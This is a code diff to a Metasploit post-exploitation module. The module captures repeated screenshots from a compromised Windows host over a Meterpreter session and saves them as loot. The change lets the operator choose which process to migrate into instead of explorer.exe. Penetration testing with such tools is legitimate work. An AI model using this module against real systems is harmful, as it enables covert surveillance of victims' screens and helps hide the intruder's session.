@@ -25,7 +25,8 @@ class MetasploitModule < Msf::Post
           'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script
           'bannedit', # post module
           'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record/loot support,log x approach, nx
-          'Adrian Kubok' # better record file names
+          'Adrian Kubok', # better record file names
+          'DLL_Cool_J' # Specify process to migrate into
         ],
       'Platform'       => ['win'], # @todo add support for posix meterpreter somehow?
       'SessionTypes'   => ['meterpreter']
@@ -36,7 +37,8 @@ class MetasploitModule < Msf::Post
         OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),
         OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
         OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
-        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them', true])
+        OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them', true]),
+        OptString.new('PROCESS', [false, 'Specify process name to migrate into', ''])
       ])
   end
 
@@ -48,11 +50,21 @@ class MetasploitModule < Msf::Post
     datastore['RECORD']
   end
 
+  def process?
+    datastore['PROCESS']
+  end
+
+
+
   def run
     host = session.session_host
     screenshot = Msf::Config.get_config_root + "/logs/" + host + ".jpg"
 
-    migrate_explorer
+    # if no process is specified, don't migrate.
+    if datastore['PROCESS'] != ''
+      migrate
+    end
+
     if session.platform !~ /windows/i
       print_error('Unsupported Platform')
       return
@@ -127,11 +139,11 @@ class MetasploitModule < Msf::Post
 
   end
 
-  def migrate_explorer
+  def migrate
     pid = session.sys.process.getpid
     session.sys.process.get_processes.each do |p|
-      if p['name'] == 'explorer.exe' and p['pid'] != pid
-        print_status("Migrating to explorer.exe pid: #{p['pid']}")
+      if p['name'] == datastore['PROCESS'] and p['pid'] != pid
+        print_status("Migrating to #{datastore['PROCESS']} pid: #{p['pid']}")
         begin
           session.core.migrate(p['pid'].to_i)
           print_good("Migration successful")
